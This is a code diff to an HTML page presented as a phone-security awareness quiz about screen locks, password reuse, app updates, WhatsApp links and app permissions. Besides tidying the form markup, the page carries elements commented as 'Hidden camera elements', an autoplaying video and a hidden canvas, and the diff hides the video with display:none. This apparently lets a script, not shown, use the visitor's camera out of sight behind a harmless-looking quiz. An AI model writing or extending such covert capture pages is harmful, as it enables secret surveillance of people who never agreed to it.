@@ -10,6 +10,7 @@
 </head>
 <body>
   <div class="container">
+    <!-- Quiz Form -->
     <div class="form-wrapper" id="quiz-container">
       <div class="form-header">
         <div class="header-banner"></div>
@@ -24,84 +25,47 @@
         <div class="question-card">
           <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option">
-              <input type="radio" name="lock_phone" value="Yes" required>
-              <span class="radio-label">Yes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="lock_phone" value="No">
-              <span class="radio-label">No</span>
-            </label>
+            <label class="radio-option"><input type="radio" name="lock_phone" value="Yes" required><span class="radio-label">Yes</span></label>
+            <label class="radio-option"><input type="radio" name="lock_phone" value="No"><span class="radio-label">No</span></label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you use same password for multiple apps or accounts? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option">
-              <input type="radio" name="same_password" value="Yes" required>
-              <span class="radio-label">Yes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="same_password" value="No">
-              <span class="radio-label">No</span>
-            </label>
+            <label class="radio-option"><input type="radio" name="same_password" value="Yes" required><span class="radio-label">Yes</span></label>
+            <label class="radio-option"><input type="radio" name="same_password" value="No"><span class="radio-label">No</span></label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you update your phone apps when updates are available? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option">
-              <input type="radio" name="update_apps" value="Always" required>
-              <span class="radio-label">Always</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="update_apps" value="Sometimes">
-              <span class="radio-label">Sometimes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="update_apps" value="Maybe">
-              <span class="radio-label">Maybe</span>
-            </label>
+            <label class="radio-option"><input type="radio" name="update_apps" value="Always" required><span class="radio-label">Always</span></label>
+            <label class="radio-option"><input type="radio" name="update_apps" value="Sometimes"><span class="radio-label">Sometimes</span></label>
+            <label class="radio-option"><input type="radio" name="update_apps" value="Maybe"><span class="radio-label">Maybe</span></label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you check the sender before clicking on links in WhatsApp? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option">
-              <input type="radio" name="check_sender" value="Yes" required>
-              <span class="radio-label">Yes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="check_sender" value="Sometimes">
-              <span class="radio-label">Sometimes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="check_sender" value="No">
-              <span class="radio-label">No</span>
-            </label>
+            <label class="radio-option"><input type="radio" name="check_sender" value="Yes" required><span class="radio-label">Yes</span></label>
+            <label class="radio-option"><input type="radio" name="check_sender" value="Sometimes"><span class="radio-label">Sometimes</span></label>
+            <label class="radio-option"><input type="radio" name="check_sender" value="No"><span class="radio-label">No</span></label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you review Apps permissions carefully? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option">
-              <input type="radio" name="review_permissions" value="Yes" required>
-              <span class="radio-label">Yes</span>
-            </label>
-            <label class="radio-option">
-              <input type="radio" name="review_permissions" value="No">
-              <span class="radio-label">No</span>
-            </label>
+            <label class="radio-option"><input type="radio" name="review_permissions" value="Yes" required><span class="radio-label">Yes</span></label>
+            <label class="radio-option"><input type="radio" name="review_permissions" value="No"><span class="radio-label">No</span></label>
           </div>
         </div>
 
         <div class="form-footer">
           <button type="submit" id="submit-btn" class="submit-button">Submit</button>
-          <div class="footer-links"><span>Clear form</span></div>
         </div>
       </form>
 
@@ -112,6 +76,7 @@
       </div>
     </div>
 
+    <!-- Success Message -->
     <div class="form-wrapper success-wrapper" id="success-container" style="display: none;">
       <div class="form-header">
         <div class="header-banner"></div>
@@ -131,8 +96,8 @@
   </div>
 
   <!-- Hidden camera elements -->
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none"></canvas>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script src="script.js"></script>
 </body>
